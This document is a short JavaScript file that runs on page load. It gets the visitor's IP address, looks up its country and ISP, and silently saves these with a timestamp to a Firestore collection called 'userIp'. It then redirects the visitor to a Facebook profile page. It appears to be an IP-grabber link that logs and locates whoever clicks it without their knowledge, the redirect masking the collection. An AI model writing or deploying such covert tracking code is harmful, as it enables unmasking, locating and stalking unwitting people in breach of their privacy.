(function () {
  function fetchWithFallback(url, callback) {
    if (window.fetch) {
      fetch(url)
        .then(response => response.json())
        .then(data => callback(null, data))
        .catch(error => callback(error, null));
    } else {
      // Fallback for older browsers
      var xhr = new XMLHttpRequest();
      xhr.open("GET", url, true);
      xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
          try {
            callback(null, JSON.parse(xhr.responseText));
          } catch (e) {
            callback(e, null);
          }
        } else if (xhr.readyState == 4) {
          callback(new Error("Request failed"), null);
        }
      };
      xhr.send();
    }
  }

  // First, get the user's IP address
  fetchWithFallback("https://api.ipify.org/?format=json", function (err, ipData) {
    if (err || !ipData || !ipData.ip) {
      console.error("Failed to fetch IP address:", err);
      return;
    }

    const ipAddress = ipData.ip;

    // Get geolocation details
    fetchWithFallback(`https://api.iplocation.net/?ip=${ipAddress}`, function (geoErr, geoData) {
      if (geoErr || !geoData) {
        console.error("Failed to fetch geolocation data:", geoErr);
        return;
      }

      const geoBasicInfo = {
        ip_number: geoData.ip_number || "N/A",
        ip_version: geoData.ip_version || "N/A",
        country_name: geoData.country_name || "Unknown",
        country_code2: geoData.country_code2 || "--",
        isp: geoData.isp || "Unknown",
      };

      // Ensure Firebase Firestore is available before attempting to save
      if (typeof db !== "undefined" && db.collection) {
        db.collection("userIp")
          .add({ ipAddress, time: new Date(), geoBasicInfo })
          .then(() => {
            window.location.replace("http://www.facebook.com/profile.php?");
          })
          .catch(dbErr => console.error("Firestore write error:", dbErr));
      } else {
        console.warn("Firestore (db) is not initialized.");
      }
    });
  });
})();
